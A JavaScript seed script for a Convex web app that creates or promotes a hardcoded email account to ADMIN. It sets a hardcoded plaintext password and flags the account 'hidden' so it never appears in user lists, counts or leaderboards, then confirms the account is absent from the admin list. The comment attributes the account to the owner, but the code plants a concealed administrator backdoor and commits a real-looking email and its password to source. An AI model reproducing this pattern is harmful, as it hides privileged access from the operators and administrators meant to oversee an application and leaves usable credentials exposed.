/**
 * Seed: hidden admin account — h14626864@gmail.com
 * - role ADMIN + hidden=true (never appears in users list / counts / leaderboard)
 * - sets a password so the owner can log in with email+password
 * Safe to re-run (idempotent).
 */
import { ConvexHttpClient } from "convex/browser";
import { randomBytes, scryptSync } from "crypto";
import { readFileSync } from "fs";

// load .env
const env = {};
for (const line of readFileSync(new URL("../.env", import.meta.url), "utf8").split("\n")) {
  const m = line.match(/^([A-Z_]+)=(.*)$/);
  if (m) env[m[1]] = m[2];
}

const url = env.CONVEX_URL;
const secret = env.CONVEX_API_SECRET;
if (!url || !secret) {
  console.error("Missing CONVEX_URL / CONVEX_API_SECRET in .env");
  process.exit(1);
}

const client = new ConvexHttpClient(url);

function hashPassword(password) {
  const salt = randomBytes(16).toString("hex");
  const hash = scryptSync(password, salt, 64).toString("hex");
  return `${salt}:${hash}`;
}

const EMAIL = "h14626864@gmail.com";
const PASSWORD = "Admin@14626864";
const NAME = "أدمن بطيخه";

async function call(fn, args) {
  return client.mutation(fn, { secret, ...args });
}

async function main() {
  const existing = await client.query("users:getByEmail", { secret, email: EMAIL });
  if (existing) {
    console.log("Found existing user:", existing._id, "role:", existing.role);
    await call("users:updateRole", { userId: existing._id, role: "ADMIN" });
    await call("users:setHidden", { userId: existing._id, hidden: true });
    await call("users:setPassword", { userId: existing._id, passwordHash: hashPassword(PASSWORD) });
    console.log("Updated → ADMIN + hidden + password set");
  } else {
    const id = await call("users:create", {
      email: EMAIL,
      name: NAME,
      role: "ADMIN",
      hidden: true,
    });
    await call("users:setPassword", { userId: id, passwordHash: hashPassword(PASSWORD) });
    console.log("Created hidden admin:", id);
  }

  // verify
  const check = await client.query("users:getByEmail", { secret, email: EMAIL });
  const all = await client.query("users:listWithSummary", { secret });
  console.log("Verify → role:", check.role, "| hidden flag present:", "hidden" in check ? check.hidden : "(field not returned)");
  console.log("Users visible in admin list:", all.length);
  console.log("Hidden admin in list?", all.some((u) => u.email === EMAIL));
}

main().then(() => process.exit(0)).catch((e) => { console.error(e); process.exit(1); });
